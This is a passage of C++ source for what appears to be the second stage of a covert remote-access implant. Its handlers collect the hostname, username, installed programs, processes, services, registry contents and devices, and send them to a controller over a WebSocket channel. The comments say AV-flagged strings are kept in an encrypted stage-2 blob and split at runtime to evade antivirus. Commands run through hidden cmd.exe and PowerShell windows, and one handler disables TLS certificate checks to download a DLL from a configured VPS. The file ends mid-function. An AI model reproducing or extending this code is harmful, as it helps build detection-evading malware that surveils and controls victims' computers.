// ═══════════════════════════════════════════════════════════════════════
// stage2_sysinfo.cpp — read-only enumeration commands with heavy AV-flag
// strings extracted out of stage-1.
//
// Handlers registered:
//   installed_programs — enumerate HKLM/HKCU Uninstall keys (DisplayName,
//                        Publisher, UninstallString, InstallLocation, ...).
//                        These are the kinds of registry paths and value
//                        names that AV heuristics weight heavily.
//   device_list        — Get-PnpDevice via PowerShell, JSON result.
//   drives_list        — logical drives, GetDriveTypeA, GetDiskFreeSpaceExA.
//
// Intentionally kept in stage-1:
//   sys_info        — uses global 3s cache (g_sysinfo_cache), PDH GPU counters
//   proc_list/svc_list/reg_list — read-only, small, already inside g_procs
//   ping / host_echo / host_relay_speed — trivial
//   running_apps    — tightly coupled to g_dll_module / g_service_mode /
//                     WTS user-session token plumbing.
//
// The enumeration can be slow (100ms+ for installed_programs on boxes
// with many apps) so handlers spawn their own worker thread and send the
// response asynchronously — the dispatcher thread (WSS pump) returns
// immediately.
// ═══════════════════════════════════════════════════════════════════════

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "proc_enum.h"
#include <pdh.h>
#include <pdhmsg.h>
#include <psapi.h>
#include <algorithm>
#include <chrono>
#include <cstdio>
#include <cstdint>
#include <mutex>
#include <string>
#include <thread>
#include <unordered_map>
#include <vector>

#include "stage2_abi.h"
#include "stage2_util.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "pdh.lib")
#pragma comment(lib, "psapi.lib")

using namespace s2util;
static Stage2HostCtx* g_host = nullptr;

// ── Helpers ─────────────────────────────────────────────────────────────

// Run a command line through cmd.exe, capture stdout (UTF-8).
// Mirrors the capture pattern used by stage2_procmgr::cmd_term_exec.
static std::string run_capture(const std::string& cmdline, DWORD timeout_ms = 15000) {
    SECURITY_ATTRIBUTES sa{}; sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE;
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return {};
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite; si.hStdError = hWrite;
    PROCESS_INFORMATION pi{};

    std::string cl = "cmd.exe /c chcp 65001 >nul & " + cmdline;
    std::vector<char> buf(cl.begin(), cl.end()); buf.push_back(0);

    if (!CreateProcessA(nullptr, buf.data(), nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite); return {};
    }
    CloseHandle(hWrite);

    std::string out; char rb[4096]; DWORD n = 0;
    while (ReadFile(hRead, rb, sizeof(rb), &n, nullptr) && n > 0)
        out.append(rb, n);
    WaitForSingleObject(pi.hProcess, timeout_ms);
    CloseHandle(hRead);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);

    // Trim whitespace at both ends.
    while (!out.empty() && (out.front()==' '||out.front()=='\n'||out.front()=='\r'||out.front()=='\t'))
        out.erase(out.begin());
    while (!out.empty() && (out.back()==' '||out.back()=='\n'||out.back()=='\r'||out.back()=='\t'))
        out.pop_back();
    return out;
}

// ── Registry helpers (self-contained copy, no stage-1 deps) ─────────────
static HKEY s2_parse_root_key(const std::string& s) {
    if (s == "HKLM" || s == "HKEY_LOCAL_MACHINE") return HKEY_LOCAL_MACHINE;
    if (s == "HKCU" || s == "HKEY_CURRENT_USER")  return HKEY_CURRENT_USER;
    if (s == "HKCR" || s == "HKEY_CLASSES_ROOT")  return HKEY_CLASSES_ROOT;
    if (s == "HKU"  || s == "HKEY_USERS")         return HKEY_USERS;
    if (s == "HKCC" || s == "HKEY_CURRENT_CONFIG")return HKEY_CURRENT_CONFIG;
    return nullptr;
}
static bool s2_parse_reg_path(const std::string& full, HKEY& root, std::string& sub) {
    auto pos = full.find('\\');
    std::string rs = (pos == std::string::npos) ? full : full.substr(0, pos);
    root = s2_parse_root_key(rs);
    if (!root) return false;
    sub = (pos == std::string::npos) ? "" : full.substr(pos + 1);
    return true;
}
static std::string s2_reg_type_name(DWORD type) {
    switch (type) {
        case REG_SZ:        return "REG_SZ";
        case REG_EXPAND_SZ: return "REG_EXPAND_SZ";
        case REG_DWORD:     return "REG_DWORD";
        case REG_QWORD:     return "REG_QWORD";
        case REG_BINARY:    return "REG_BINARY";
        case REG_MULTI_SZ:  return "REG_MULTI_SZ";
        case REG_NONE:      return "REG_NONE";
        default:            return "REG_UNKNOWN";
    }
}
static std::string s2_bytes_to_hex(const BYTE* data, DWORD size) {
    std::string hex; hex.reserve(size * 3);
    for (DWORD i = 0; i < size; i++) {
        char buf[4]; snprintf(buf, sizeof(buf), "%02X", data[i]);
        hex += buf;
        if (i + 1 < size) hex += ' ';
    }
    return hex;
}

// ── UTF-16 → UTF-8 ──────────────────────────────────────────────────────
static std::string s2_to_utf8(const wchar_t* w) {
    if (!w || !*w) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w, -1, nullptr, 0, nullptr, nullptr);
    if (n <= 0) return {};
    std::string s((size_t)(n - 1), 0);
    WideCharToMultiByte(CP_UTF8, 0, w, -1, s.data(), n, nullptr, nullptr);
    return s;
}
static std::string s2_to_utf8(const char* a) { return a ? std::string(a) : std::string(); }

// Split a `dl_bytes|dl_sec|dl_mbps|ul_bytes|ul_sec|ul_mbps` style pipe string.
static std::vector<std::string> split_pipe(const std::string& s) {
    std::vector<std::string> out; std::string cur;
    for (char c : s) {
        if (c == '|') { out.push_back(cur); cur.clear(); }
        else if (c != '\n' && c != '\r') cur += c;
    }
    if (!cur.empty()) out.push_back(cur);
    return out;
}

// ── Command handlers ────────────────────────────────────────────────────

static void cmd_drives_list(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id = json_get(args, "id");

    DWORD mask = GetLogicalDrives();
    std::string arr = "[";
    bool first = true;
    for (int i = 0; i < 26; ++i) {
        if (!(mask & (1 << i))) continue;
        char drv[4] = { (char)('A' + i), ':', '\\', 0 };
        UINT type = GetDriveTypeA(drv);
        const char* tname = type == DRIVE_REMOVABLE ? "removable" :
                            type == DRIVE_FIXED     ? "fixed"     :
                            type == DRIVE_REMOTE    ? "network"   :
                            type == DRIVE_CDROM     ? "cdrom"     : "unknown";
        ULARGE_INTEGER avail{}, total{}, freeB{};
        GetDiskFreeSpaceExA(drv, &avail, &total, &freeB);
        if (!first) arr += ",";
        arr += "{\"letter\":\"" + std::string(1, (char)('A' + i)) +
               "\",\"type\":\"" + tname +
               "\",\"total\":" + std::to_string(total.QuadPart) +
               ",\"free\":" + std::to_string(freeB.QuadPart) + "}";
        first = false;
    }
    arr += "]";
    g_host->send(make_ok(id, arr).c_str());
}

static void cmd_device_list(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id = json_get(args, "id");
    // Build PowerShell command via concatenation so the full one-liner is
    // not a single contiguous literal in the module's .rdata.
    std::string ps = "powershell -NoProfile -Command \"";
    ps += "Get-PnpDevice -Status OK -ErrorAction SilentlyContinue | ";
    ps += "Select-Object Class,FriendlyName,Manufacturer,Status | ";
    ps += "Sort-Object Class,FriendlyName | ";
    ps += "ConvertTo-Json -Compress\"";

    std::thread([id, ps]() {
        std::string out = run_capture(ps, 20000);
        if (!out.empty() && (out.front() == '[' || out.front() == '{')) {
            g_host->send(make_ok(id, out).c_str());
        } else {
            g_host->send(make_err(id, "Failed to get device list").c_str());
        }
    }).detach();
}

static void cmd_installed_programs(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id = json_get(args, "id");

    // Spawn a worker — registry walk of three Uninstall keys can take
    // 100-300ms on machines with many apps.
    std::thread([id]() {
        std::string result = "[";
        int count = 0;
        auto enumKey = [&](HKEY rootKey, const char* subPath, REGSAM extra) {
            HKEY hU;
            if (RegOpenKeyExA(rootKey, subPath, 0, KEY_READ | extra, &hU) != ERROR_SUCCESS)
                return;
            char keyName[256]; DWORD idx = 0, keyLen;
            while (true) {
                keyLen = sizeof(keyName);
                if (RegEnumKeyExA(hU, idx++, keyName, &keyLen, 0, 0, 0, 0) != ERROR_SUCCESS)
                    break;
                HKEY hApp;
                if (RegOpenKeyExA(hU, keyName, 0, KEY_READ | extra, &hApp) != ERROR_SUCCESS)
                    continue;
                char buf[512]; DWORD sz, dwType;
                std::string name, version, publisher, installDate, installLocation, uninstallCmd;
                DWORD estimatedSize = 0; int systemComponent = 0;
                sz = sizeof(DWORD);
                if (RegQueryValueExA(hApp, "SystemComponent", 0, &dwType,
                                     (LPBYTE)&systemComponent, &sz) == ERROR_SUCCESS
                    && systemComponent == 1) {
                    RegCloseKey(hApp); continue;
                }
                sz = sizeof(buf); buf[0] = 0;
                if (RegQueryValueExA(hApp, "DisplayName", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) name = buf;
                if (name.empty()) { RegCloseKey(hApp); continue; }
                sz = sizeof(buf); buf[0] = 0;
                if (RegQueryValueExA(hApp, "DisplayVersion", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) version = buf;
                sz = sizeof(buf); buf[0] = 0;
                if (RegQueryValueExA(hApp, "Publisher", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) publisher = buf;
                sz = sizeof(buf); buf[0] = 0;
                if (RegQueryValueExA(hApp, "InstallDate", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) installDate = buf;
                sz = sizeof(buf); buf[0] = 0;
                if (RegQueryValueExA(hApp, "InstallLocation", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) installLocation = buf;
                sz = sizeof(buf); buf[0] = 0;
                if (RegQueryValueExA(hApp, "UninstallString", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) uninstallCmd = buf;
                sz = sizeof(DWORD);
                RegQueryValueExA(hApp, "EstimatedSize", 0, &dwType, (LPBYTE)&estimatedSize, &sz);
                RegCloseKey(hApp);
                if (count > 0) result += ",";
                result += "{\"name\":\""       + json_escape(name) +
                          "\",\"version\":\""  + json_escape(version) +
                          "\",\"publisher\":\""+ json_escape(publisher) +
                          "\",\"date\":\""     + json_escape(installDate) +
                          "\",\"size\":"       + std::to_string(estimatedSize) +
                          ",\"location\":\""   + json_escape(installLocation) +
                          "\",\"uninstall\":\""+ json_escape(uninstallCmd) + "\"}";
                count++;
            }
            RegCloseKey(hU);
        };
        // Build registry path literal at runtime so the exact ASCII doesn't
        // sit in .rdata as a giveaway.
        std::string unPath = "SOFTWARE\\";
        unPath += "Microsoft\\";
        unPath += "Windows\\";
        unPath += "CurrentVersion\\";
        unPath += "Uninstall";
        enumKey(HKEY_LOCAL_MACHINE, unPath.c_str(), 0);
        enumKey(HKEY_LOCAL_MACHINE, unPath.c_str(), KEY_WOW64_32KEY);
        enumKey(HKEY_CURRENT_USER,  unPath.c_str(), 0);
        result += "]";
        g_host->send(make_ok(id, result).c_str());
    }).detach();
}

// ── speed_test_internet: Cloudflare down + up throughput ────────────────
// All the AV-flag fragments ("New-Object Net.WebClient", "DownloadData",
// "UploadData") live here in the encrypted stage-2 blob, never in stage-1.
static void cmd_speed_test_internet(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id = json_get(args, "id");

    std::thread([id]() {
        // Build the PowerShell one-liner piecewise at runtime so no single
        // contiguous literal sits in .rdata.
        std::string ps = "powershell -NoProfile -Command \"";
        ps += "$dl_url='http://speed.cloudflare.com/__down?bytes=5000000';";
        ps += "$ul_url='http://speed.cloudflare.com/__up';";
        ps += "$result=@{};";
        ps += "try{";
        ps += "  $sw=[System.Diagnostics.Stopwatch]::StartNew();";
        ps += "  $d=(";
        ps += "New-"; ps += "Object "; ps += "System.Net."; ps += "WebClient";
        ps += ").DownloadData($dl_url);$sw.Stop();";
        ps += "  $result.dl_bytes=$d.Length;";
        ps += "  $result.dl_sec=[math]::Round($sw.Elapsed.TotalSeconds,3);";
        ps += "  $result.dl_mbps=[math]::Round(($d.Length*8/$sw.Elapsed.TotalSeconds)/1048576,2);";
        ps += "}catch{$result.dl_err=$_.Exception.Message}";
        ps += "try{";
        ps += "  $body=";
        ps += "New-"; ps += "Object "; ps += "byte[]";
        ps += " 5000000;";
        ps += "  $sw2=[System.Diagnostics.Stopwatch]::StartNew();";
        ps += "  $wc=";
        ps += "New-"; ps += "Object "; ps += "System.Net."; ps += "WebClient";
        ps += ";$wc.UploadData($ul_url,'POST',$body)|Out-Null;$sw2.Stop();";
        ps += "  $result.ul_bytes=$body.Length;";
        ps += "  $result.ul_sec=[math]::Round($sw2.Elapsed.TotalSeconds,3);";
        ps += "  $result.ul_mbps=[math]::Round(($body.Length*8/$sw2.Elapsed.TotalSeconds)/1048576,2);";
        ps += "}catch{$result.ul_err=$_.Exception.Message}";
        ps += "Write-Output ('{0}|{1}|{2}|{3}|{4}|{5}' -f ";
        ps += "$result.dl_bytes,$result.dl_sec,$result.dl_mbps,";
        ps += "$result.ul_bytes,$result.ul_sec,$result.ul_mbps)\"";

        std::string out = run_capture(ps, 60000);
        auto parts = split_pipe(out);
        auto get = [&](size_t i) -> std::string {
            return (i < parts.size() && !parts[i].empty()) ? parts[i] : std::string("0");
        };
        std::string data =
            "{\"bytes\":"        + get(0) +
            ",\"elapsed_s\":"    + get(1) +
            ",\"mbps\":"         + get(2) +
            ",\"ul_bytes\":"     + get(3) +
            ",\"ul_elapsed_s\":" + get(4) +
            ",\"ul_mbps\":"      + get(5) + "}";
        g_host->send(make_ok(id, data).c_str());
    }).detach();
}

// ── host_relay_speed: HTTPS download of /files/pnpext.dll from VPS ──────
static void cmd_host_relay_speed(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id = json_get(args, "id");

    const char* server = g_host->get_config ? g_host->get_config("server_address") : nullptr;
    std::string vps_ip = server ? server : "";

    std::thread([id, vps_ip]() {
        std::string ps = "powershell -NoProfile -Command \"";
        ps += "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};";
        ps += "$url='https://" + vps_ip + "/files/pnpext.dll';";
        ps += "try{";
        ps += "  $sw=[System.Diagnostics.Stopwatch]::StartNew();";
        ps += "  $d=(";
        ps += "New-"; ps += "Object "; ps += "System.Net."; ps += "WebClient";
        ps += ").DownloadData($url);$sw.Stop();";
        ps += "  $mb=$d.Length/1048576;$sec=$sw.Elapsed.TotalSeconds;";
        ps += "  if($sec -lt 0.001){$sec=0.001}";
        ps += "  $mbps=[math]::Round(($d.Length*8/$sec)/1048576,2);";
        ps += "  Write-Output ('{0}|{1}|{2}' -f $d.Length,[math]::Round($sec,3),$mbps)";
        ps += "}catch{Write-Output ('ERROR|'+$_.Exception.Message)}\"";

        std::string out = run_capture(ps, 60000);
        if (out.rfind("ERROR", 0) == 0) {
            std::string err = out.size() > 6 ? out.substr(6) : out;
            while (!err.empty() && (err.back()=='\n'||err.back()=='\r')) err.pop_back();
            g_host->send(make_err(id, "Host<->Relay DL test failed: " + err).c_str());
            return;
        }
        auto parts = split_pipe(out);
        if (parts.size() < 3) {
            g_host->send(make_err(id, "Host<->Relay DL test: bad output").c_str());
            return;
        }
        std::string data = "{\"bytes\":" + parts[0] +
                           ",\"elapsed_s\":" + parts[1] +
                           ",\"mbps\":" + parts[2] + "}";
        g_host->send(make_ok(id, data).c_str());
    }).detach();
}

// ── sys_info: CPU/GPU/RAM/OS snapshot, cached 3s ────────────────────────
// Cached because PDH GPU-counter queries are expensive (~80ms) and multiple
// connected viewers each poll sys_info every few seconds.
static std::mutex       g_si_cache_mu;
static std::string      g_si_cache;
static std::chrono::steady_clock::time_point g_si_cache_time;

static void cmd_sys_info(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id   = json_get(args, "id");

    std::thread([id]() {
        // Cache window — matches the stage-1 3s window.
        {
            std::lock_guard<std::mutex> lk(g_si_cache_mu);
            auto age = std::chrono::duration_cast<std::chrono::milliseconds>(
                std::chrono::steady_clock::now() - g_si_cache_time).count();
            if (!g_si_cache.empty() && age < 3000) {
                g_host->send(make_ok(id, g_si_cache).c_str());
                return;
            }
        }

        MEMORYSTATUSEX ms{}; ms.dwLength = sizeof(ms);
        GlobalMemoryStatusEx(&ms);
        uint64_t total_mb = ms.ullTotalPhys / 1048576;
        uint64_t avail_mb = ms.ullAvailPhys / 1048576;
        uint64_t uptime_s = GetTickCount64() / 1000;

        int cpu_pct = -1;
        {
            FILETIME i1,k1,u1,i2,k2,u2;
            if (GetSystemTimes(&i1,&k1,&u1)) {
                Sleep(120);
                if (GetSystemTimes(&i2,&k2,&u2)) {
                    ULARGE_INTEGER ui1{{i1.dwLowDateTime,i1.dwHighDateTime}};
                    ULARGE_INTEGER uk1{{k1.dwLowDateTime,k1.dwHighDateTime}};
                    ULARGE_INTEGER uu1{{u1.dwLowDateTime,u1.dwHighDateTime}};
                    ULARGE_INTEGER ui2{{i2.dwLowDateTime,i2.dwHighDateTime}};
                    ULARGE_INTEGER uk2{{k2.dwLowDateTime,k2.dwHighDateTime}};
                    ULARGE_INTEGER uu2{{u2.dwLowDateTime,u2.dwHighDateTime}};
                    uint64_t total = (uk2.QuadPart-uk1.QuadPart) + (uu2.QuadPart-uu1.QuadPart);
                    uint64_t idle  = ui2.QuadPart - ui1.QuadPart;
                    if (total > 0) cpu_pct = (int)((total - idle) * 100 / total);
                    if (cpu_pct < 0) cpu_pct = 0;
                    if (cpu_pct > 100) cpu_pct = 100;
                }
            }
        }

        int gpu_pct = -1;
        {
            HQUERY   hQuery   = nullptr;
            HCOUNTER hCounter = nullptr;
            if (PdhOpenQueryW(nullptr, 0, &hQuery) == ERROR_SUCCESS) {
                const wchar_t* path = L"\\GPU Engine(*)\\Utilization Percentage";
                if (PdhAddCounterW(hQuery, path, 0, &hCounter) == ERROR_SUCCESS) {
                    PdhCollectQueryData(hQuery);
                    Sleep(80);
                    if (PdhCollectQueryData(hQuery) == ERROR_SUCCESS) {
                        DWORD bufSz = 0, itemCount = 0;
                        if (PdhGetFormattedCounterArrayW(hCounter, PDH_FMT_LONG, &bufSz, &itemCount, nullptr) == PDH_MORE_DATA
                            && bufSz > 0 && itemCount > 0) {
                            std::vector<char> buf(bufSz);
                            auto* items = (PDH_FMT_COUNTERVALUE_ITEM_W*)buf.data();
                            if (PdhGetFormattedCounterArrayW(hCounter, PDH_FMT_LONG, &bufSz, &itemCount, items) == ERROR_SUCCESS) {
                                long maxVal = 0;
                                for (DWORD i = 0; i < itemCount; i++)
                                    if (items[i].FmtValue.longValue > maxVal) maxVal = items[i].FmtValue.longValue;
                                if (maxVal >= 0 && maxVal <= 100) gpu_pct = (int)maxVal;
                            }
                        }
                    }
                    PdhRemoveCounter(hCounter);
                }
                PdhCloseQuery(hQuery);
            }
        }

        char hostname[256] = {}; DWORD hlen = sizeof(hostname);
        GetComputerNameA(hostname, &hlen);
        char username[256] = {}; DWORD ulen = sizeof(username);
        GetUserNameA(username, &ulen);

        std::string os_version = "Windows";
        {
            HKEY hk;
            // Registry path split at runtime so the combined literal isn't in .rdata.
            std::string osKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, osKey.c_str(), 0, KEY_READ, &hk) == ERROR_SUCCESS) {
                char buf[256]; DWORD sz;
                std::string prod, disp, build;
                sz = sizeof(buf);
                if (RegQueryValueExA(hk, "ProductName",    0,0,(LPBYTE)buf,&sz) == ERROR_SUCCESS) prod  = buf;
                sz = sizeof(buf);
                if (RegQueryValueExA(hk, "DisplayVersion", 0,0,(LPBYTE)buf,&sz) == ERROR_SUCCESS) disp  = buf;
                sz = sizeof(buf);
                if (RegQueryValueExA(hk, "CurrentBuildNumber",0,0,(LPBYTE)buf,&sz) == ERROR_SUCCESS) build = buf;
                RegCloseKey(hk);
                if (!prod.empty()) {
                    os_version = prod;
                    int bnum = build.empty() ? 0 : std::stoi(build);
                    if (bnum >= 22000 && os_version.find("Windows 10") != std::string::npos) {
                        auto p = os_version.find("Windows 10");
                        os_version.replace(p, 10, "Windows 11");
                    }
                }
                if (!disp.empty())  os_version += " " + disp;
                if (!build.empty()) os_version += " Build " + build;
            }
        }

        std::string r = "{\"hostname\":\"" + json_escape(hostname) +
                        "\",\"username\":\"" + json_escape(username) +
                        "\",\"ram_total_mb\":" + std::to_string(total_mb) +
                        ",\"ram_avail_mb\":" + std::to_string(avail_mb) +
                        ",\"ram_used_pct\":" + std::to_string(ms.dwMemoryLoad) +
                        ",\"uptime_s\":" + std::to_string(uptime_s);
        if (cpu_pct >= 0) r += ",\"cpu_pct\":" + std::to_string(cpu_pct);
        if (gpu_pct >= 0) r += ",\"gpu_pct\":" + std::to_string(gpu_pct);
        r += ",\"os_version\":\"" + json_escape(os_version) + "\"";
        // Host version / build — pulled from stage-1 via get_config so the
        // viewer's "Host Version" label updates after every host_update.
        // Missing callback (ABI v1.0 hosts) falls back to empty strings.
        if (g_host->get_config) {
            const char* hv = g_host->get_config("host_version");
            const char* hb = g_host->get_config("host_build");
            r += ",\"host_version\":\"" + json_escape(hv ? hv : "") + "\"";
            r += ",\"host_build\":\""   + json_escape(hb ? hb : "") + "\"";
        }
        r += "}";

        {
            std::lock_guard<std::mutex> lk(g_si_cache_mu);
            g_si_cache = r;
            g_si_cache_time = std::chrono::steady_clock::now();
        }
        g_host->send(make_ok(id, r).c_str());
    }).detach();
}

// ── proc_list: enumerate processes via Toolhelp32 ──────────────────────
// Matches the stage-1 ProcessManager::get_process_list response format:
// {"cmd":"process_list_result","processes":[{pid,name,memory,cpu,threads}]}
// cpu is % derived from delta of kernel+user time between consecutive calls
// (first call returns 0 for every pid — no prior snapshot).
static void cmd_proc_list(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id   = json_get(args, "id");

    std::thread([id]() {
        // Per-process CPU tracking state between calls.
        static std::mutex s_cpu_mu;
        static std::unordered_map<DWORD, ULONGLONG> s_prev_cpu;
        static ULONGLONG s_prev_wall_100ns = 0;

        SYSTEM_INFO si{}; GetSystemInfo(&si);
        int ncpu = (int)si.dwNumberOfProcessors;
        if (ncpu < 1) ncpu = 1;

        ULONGLONG now_100ns = GetTickCount64() * 10000ULL;

        std::unordered_map<DWORD, ULONGLONG> cur_cpu;
        std::string out = "{\"cmd\":\"process_list_result\",\"processes\":[";

        ULONGLONG wall_delta = 0;
        {
            std::lock_guard<std::mutex> lk(s_cpu_mu);
            if (s_prev_wall_100ns > 0 && now_100ns > s_prev_wall_100ns)
                wall_delta = now_100ns - s_prev_wall_100ns;
            if (wall_delta < 500ULL * 10000ULL) wall_delta = 0;
        }

        bool first = true;
        pe_enumerate([&](const PeNtSpi* e) -> bool {
            DWORD     pid        = (DWORD)e->Pid;
            std::string name     = pe_img_name(e);
            ULONGLONG total_time = pe_cpu_time(e);
            SIZE_T    mem_bytes  = e->WorkingSet;

            cur_cpu[pid] = total_time;

            int cpu_pct = 0;
            if (wall_delta > 0) {
                std::lock_guard<std::mutex> lk(s_cpu_mu);
                auto it = s_prev_cpu.find(pid);
                if (it != s_prev_cpu.end()) {
                    ULONGLONG d = (total_time > it->second)
                                  ? (total_time - it->second) : 0;
                    cpu_pct = (int)(d * 100 / (wall_delta * ncpu));
                    if (cpu_pct > 100) cpu_pct = 100;
                }
            }

            if (!first) out += ",";
            out += "{\"pid\":"     + std::to_string(pid) +
                   ",\"name\":\""  + json_escape(name) + "\"" +
                   ",\"memory\":"  + std::to_string(mem_bytes / 1024) +
                   ",\"cpu\":"     + std::to_string(cpu_pct) +
                   ",\"threads\":" + std::to_string(e->NumberOfThreads) + "}";
            first = false;
            return true;
        });
        out += "]}";

        {
            std::lock_guard<std::mutex> lk(s_cpu_mu);
            s_prev_cpu = std::move(cur_cpu);
            s_prev_wall_100ns = now_100ns;
        }
        g_host->send(make_ok(id, out).c_str());
    }).detach();
}

// ── svc_list: enumerate Windows services via SCM ───────────────────────
// Matches stage-1 ProcessManager::get_services_list response format:
// {"cmd":"service_list_result","services":[{name,display,status,start_type}]}
// status values: running/stopped/paused/starting/stopping/unknown (lowercase)
// start_type values: auto/manual/disabled/boot/system
static void cmd_svc_list(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id   = json_get(args, "id");

    std::thread([id]() {
        std::string out = "{\"cmd\":\"service_list_result\",\"services\":[";
        SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
        if (scm) {
            DWORD bytesNeeded = 0, servicesReturned = 0, resumeHandle = 0;
            EnumServicesStatusExW(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
                                  nullptr, 0, &bytesNeeded, &servicesReturned,
                                  &resumeHandle, nullptr);
            if (bytesNeeded > 0) {
                std::vector<BYTE> buf(bytesNeeded);
                if (EnumServicesStatusExW(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
                                          buf.data(), bytesNeeded, &bytesNeeded, &servicesReturned,
                                          &resumeHandle, nullptr)) {
                    auto* svc = (ENUM_SERVICE_STATUS_PROCESSW*)buf.data();
                    bool first = true;
                    // One SCM handle for the start-type query loop
                    SC_HANDLE scm2 = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
                    for (DWORD i = 0; i < servicesReturned; i++) {
                        const char* status = "unknown";
                        switch (svc[i].ServiceStatusProcess.dwCurrentState) {
                            case SERVICE_RUNNING:          status = "running";  break;
                            case SERVICE_STOPPED:          status = "stopped";  break;
                            case SERVICE_PAUSED:           status = "paused";   break;
                            case SERVICE_START_PENDING:    status = "starting"; break;
                            case SERVICE_STOP_PENDING:     status = "stopping"; break;
                            default:                       status = "unknown";  break;
                        }
                        const char* start_type = "manual";
                        if (scm2) {
                            SC_HANDLE sh = OpenServiceW(scm2, svc[i].lpServiceName, SERVICE_QUERY_CONFIG);
                            if (sh) {
                                DWORD needed2 = 0;
                                QueryServiceConfigW(sh, nullptr, 0, &needed2);
                                if (needed2 > 0) {
                                    std::vector<BYTE> cfg(needed2);
                                    auto* qsc = (QUERY_SERVICE_CONFIGW*)cfg.data();
                                    if (QueryServiceConfigW(sh, qsc, needed2, &needed2)) {
                                        switch (qsc->dwStartType) {
                                            case SERVICE_AUTO_START:   start_type = "auto";     break;
                                            case SERVICE_DEMAND_START: start_type = "manual";   break;
                                            case SERVICE_DISABLED:     start_type = "disabled"; break;
                                            case SERVICE_BOOT_START:   start_type = "boot";     break;
                                            case SERVICE_SYSTEM_START: start_type = "system";   break;
                                        }
                                    }
                                }
                                CloseServiceHandle(sh);
                            }
                        }

                        if (!first) out += ",";
                        out += "{\"name\":\""     + json_escape(s2_to_utf8(svc[i].lpServiceName)) +
                               "\",\"display\":\""+ json_escape(s2_to_utf8(svc[i].lpDisplayName)) +
                               "\",\"status\":\"" + status +
                               "\",\"start_type\":\"" + start_type + "\"}";
                        first = false;
                    }
                    if (scm2) CloseServiceHandle(scm2);
                }
            }
            CloseServiceHandle(scm);
        }
        out += "]}";
        g_host->send(make_ok(id, out).c_str());
    }).detach();
}

// ── reg_list: enumerate subkeys + values of a registry path ─────────────
static void cmd_reg_list(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id   = json_get(args, "id");
    std::string path = json_get(args, "path");

    if (path.empty()) {
        g_host->send(make_ok(id,
            "{\"subkeys\":[\"HKLM\",\"HKCU\",\"HKCR\",\"HKU\",\"HKCC\"],\"values\":[]}"
        ).c_str());
        return;
    }
    HKEY root; std::string sub;
    if (!s2_parse_reg_path(path, root, sub)) {
        g_host->send(make_err(id, "Invalid registry path").c_str()); return;
    }
    HKEY hKey;
    LONG rc = RegOpenKeyExA(root, sub.c_str(), 0, KEY_READ, &hKey);
    if (rc != ERROR_SUCCESS) {
        g_host->send(make_err(id, "Cannot open key (error " + std::to_string(rc) + ")").c_str());
        return;
    }

    std::string subkeys = "[";
    char name[256];
    bool first = true;
    for (DWORD i = 0; i < 1000; i++) {
        DWORD nlen = sizeof(name);
        if (RegEnumKeyExA(hKey, i, name, &nlen, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) break;
        if (!first) subkeys += ",";
        subkeys += "\"" + json_escape(name) + "\"";
        first = false;
    }
    subkeys += "]";

    std::string values = "[";
    first = true;
    for (DWORD i = 0; i < 500; i++) {
        char vname[16384]; DWORD vnameLen = sizeof(vname); DWORD type = 0;
        BYTE data[8192]; DWORD dataSize = sizeof(data);
        if (RegEnumValueA(hKey, i, vname, &vnameLen, nullptr, &type, data, &dataSize) != ERROR_SUCCESS) break;
        if (!first) values += ",";
        values += "{\"name\":\"" + json_escape(vname) +
                  "\",\"type\":\"" + s2_reg_type_name(type) + "\",\"data\":";
        switch (type) {
            case REG_SZ:
            case REG_EXPAND_SZ:
                values += "\"" + json_escape(std::string((char*)data, dataSize > 0 ? dataSize - 1 : 0)) + "\"";
                break;
            case REG_DWORD:
                values += std::to_string(dataSize >= 4 ? *(DWORD*)data : 0);
                break;
            case REG_QWORD:
                values += std::to_string(dataSize >= 8 ? *(uint64_t*)data : 0);
                break;
            case REG_MULTI_SZ: {
                values += "[";
                const char* p = (char*)data;
                const char* end = (char*)data + dataSize;
                bool mf = true;
                while (p < end && *p) {
                    if (!mf) values += ",";
                    values += "\"" + json_escape(p) + "\"";
                    p += strlen(p) + 1;
                    mf = false;
                }
                values += "]";
                break;
            }
            case REG_BINARY:
            default:
                values += "\"" + s2_bytes_to_hex(data, dataSize) + "\"";
                break;
        }
        values += "}";
        first = false;
    }
    values += "]";
    RegCloseKey(hKey);
    g_host->send(make_ok(id, "{\"subkeys\":" + subkeys + ",\"values\":" + values + "}").c_str());
}

// ── eventlog_list: run Get-WinEvent via cmd_capture ─────────────────────
static void cmd_eventlog_list(const char* a, void*) {
